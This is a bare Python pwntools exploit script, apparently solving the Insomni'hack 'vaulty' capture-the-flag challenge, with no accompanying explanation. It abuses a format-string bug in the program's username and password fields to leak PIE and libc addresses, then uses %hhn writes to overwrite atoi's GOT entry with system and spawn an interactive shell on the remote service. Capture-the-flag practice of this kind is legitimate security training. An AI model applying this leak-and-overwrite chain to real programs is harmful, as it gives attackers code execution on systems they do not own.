from pwn import *

if args.LOCAL:
    io=process('./vaulty_patched')
    if args.GDB:
        cmd="""
        init-pwndbg
        brva 0x00000000000016E1 
        """
        gdb.attach(io, cmd)
else:
    io=remote('vaulty.insomnihack.ch',4556)
elf=ELF('./vaulty_patched')
libc=ELF('./libc.so.6')
def create(user_name, password, url):
    io.sendlineafter(b'(1-5):\n', b'1')
    io.sendlineafter(b'Username: \n', user_name)
    io.sendlineafter(b'Password: \n', password)
    io.sendlineafter(b'URL: \n', url)
    
def modify(idx, user_name, password, url):
    io.sendlineafter(b'(1-5):\n', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b'New Username:', user_name)
    io.sendlineafter(b'New Password:', password)
    io.sendlineafter(b'New URL:', url)
    

def delete(idx):
    io.sendlineafter(b'(1-5):\n', b'3')
    io.sendlineafter(b': ', str(idx).encode())
    
def show(idx):
    io.sendlineafter(b'(1-5):\n', b'4')
    io.sendlineafter(b':\n', str(idx).encode())
    
def exit_():
    io.sendlineafter(b'(1-5):\n', b'5')
    

create(b'%13$p', b'A', b'B')
show(0)
io.recvuntil(b'Username: ')
pie=int(io.recv(14), 16) - 0x1984
print(hex(pie))

create(p64(elf.got.puts+pie), b'%28$s', b'%p')
show(1)
io.recvuntil(b'Password: ')
libc_=u64(io.recv(6)+b'\0\0') -0x80e50
print(hex(libc_))

system = libc_ + libc.sym.system
off_2 = (system >> 8*2)&0xff
off_1 = (system >> 8*1)&0xff
off_0 = (system >> 8*0)&0xff
modify(0, '%{}c%25$hhn'.format(off_1).encode()+'%{}c%24$hhn'.format(off_1-off_2).encode(), '%{}c%26$hhn'.format(off_0).encode(), p64(pie+elf.got.atoi+2)+ p64(pie+elf.got.atoi+1)+p64(pie+elf.got.atoi))
pause()
show(0)
io.sendline(b'sh')
io.interactive()